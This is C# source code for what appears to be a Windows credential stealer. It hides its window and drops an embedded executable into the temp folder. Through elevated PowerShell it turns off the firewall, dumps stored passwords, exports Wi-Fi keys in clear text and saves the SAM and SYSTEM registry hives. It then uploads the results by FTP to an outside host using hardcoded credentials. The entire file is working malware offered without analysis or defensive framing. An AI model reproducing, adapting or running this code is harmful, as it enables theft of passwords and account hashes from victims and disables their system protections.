using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace a
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            string username = Environment.UserName;
            string tmppath = Path.GetTempPath();
            CheckForDuplicates(tmppath, username);
            Assembly currentAssembly = Assembly.GetExecutingAssembly();
            Stream? resourceStream = currentAssembly.GetManifestResourceStream("a.cp.exe");
            if (resourceStream != null)
            {
                using (resourceStream)
                {
                    byte[] resourceBytes = new byte[resourceStream.Length];
                    resourceStream.Read(resourceBytes, 0, resourceBytes.Length);
                    File.WriteAllBytes(Path.Combine(tmppath, "cp.exe"), resourceBytes);
                }
            }
            ExecuteCommand($"netsh advfirewall set allprofiles state off;cd {tmppath};./cp.exe /stext {username};netsh wlan export profile key=clear;reg save HKLM\\sam ./sam{username}.save; reg save HKLM\\system ./system{username}.save");
            var client = new WebClient();
            File.Create($"{tmppath}\\\\a.xml").Close();
            client.Credentials = new NetworkCredential("hack123", "Dr0bnyy");
            client.UploadFile($"ftp://konik.endora.cz/{username}", WebRequestMethods.Ftp.UploadFile, Path.Combine(tmppath, username));
            client.UploadFile($"ftp://konik.endora.cz/sam{username}.save", WebRequestMethods.Ftp.UploadFile, Path.Combine(tmppath, $"sam{username}.save"));
            client.UploadFile($"ftp://konik.endora.cz/system{username}.save", WebRequestMethods.Ftp.UploadFile, Path.Combine(tmppath, $"system{username}.save"));
            foreach (var file in Directory.GetFiles(tmppath, "*.xml"))
                client.UploadFile($"ftp://konik.endora.cz/{file.Substring(file.LastIndexOf('\\')+1)}", WebRequestMethods.Ftp.UploadFile, file);
        }
        private static void CheckForDuplicates(string tmppath, string username)
        {
            if (File.Exists(Path.Combine(tmppath, "cp.exe")))
                File.Delete(Path.Combine(tmppath, "cp.exe"));
            if (File.Exists(Path.Combine(tmppath, $"system{username}.save")))
                File.Delete(Path.Combine(tmppath, $"system{username}.save"));
            if (File.Exists(Path.Combine(tmppath, $"sam{username}.save")))
                File.Delete(Path.Combine(tmppath, $"sam{username}.save"));
            if (File.Exists(Path.Combine(tmppath, username)))
                File.Delete(Path.Combine(tmppath, username));
            foreach (var file in Directory.GetFiles(tmppath, "*.xml"))
                if (File.Exists(file))
                    File.Delete(file);
        }
        private static void ExecuteCommand(string command)
        {
            var processStartInfo = new ProcessStartInfo();
            processStartInfo.Verb = "runas";
            processStartInfo.FileName = "powershell.exe";
            processStartInfo.Arguments = $"-Command \"{command}\"";
            processStartInfo.UseShellExecute = false;
            processStartInfo.RedirectStandardOutput = true;

            using var process = new Process();
            process.StartInfo = processStartInfo;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            Console.WriteLine(output);
        }
    }
}
